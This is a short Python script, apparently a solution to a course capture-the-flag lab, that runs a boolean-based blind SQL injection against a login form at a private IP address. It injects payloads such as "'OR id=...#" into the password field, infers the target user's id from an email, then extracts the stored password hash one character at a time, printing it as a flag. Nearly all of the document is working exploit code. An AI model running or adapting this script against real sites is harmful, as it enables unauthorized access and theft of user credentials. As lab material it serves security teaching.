import requests
import urllib3
import sys

urllib3.disable_warnings()

BASE           = 'https://10.9.96.228:9070'
TRUE_THRESHOLD = 8000

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <email>")
    sys.exit(1)

TARGET_EMAIL = sys.argv[1]

CHARSET = [ord(c) for c in "0123456789abcdefABCDEF"]

def is_true(payload):
    try:
        r = requests.Session().post(
            f"{BASE}/index.php",
            data={"login_email": TARGET_EMAIL, "login_pass": payload, "login": ""},
            verify=False, timeout=5
        )
        return len(r.text) < TRUE_THRESHOLD
    except:
        return False


roll_part = "".join(filter(str.isdigit, TARGET_EMAIL))[-5:]
user_id = None

for i in range(1, 201):
    if is_true(f"'OR id={i}#"):
        if is_true(f"'OR id={i}&&email LIKE'%{roll_part}%'#"):
            user_id = i
            break
    print(f"\r  Scanning id={i}...", end="", flush=True)

if not user_id:
    print("\n[-] User ID not found.")
    sys.exit(1)
print(f"\r  Found user ID: {user_id}          ")


pwd_len = 32  # default MD5 length
for n in range(1, 65):
    if is_true(f"'OR id={user_id}&&LENGTH(password)={n}#"):
        pwd_len = n
        break

result = ""
for pos in range(1, pwd_len + 1):
    for ascii_val in CHARSET:
        if is_true(f"'OR id={user_id}&&ORD(MID(password,{pos},1))={ascii_val}#"):
            result += chr(ascii_val)
            break
    else:
        result += "?"
    print(f"\r  Extracting: {result:<35}", end="", flush=True)

print(f"\ncs6903{{{result}}}")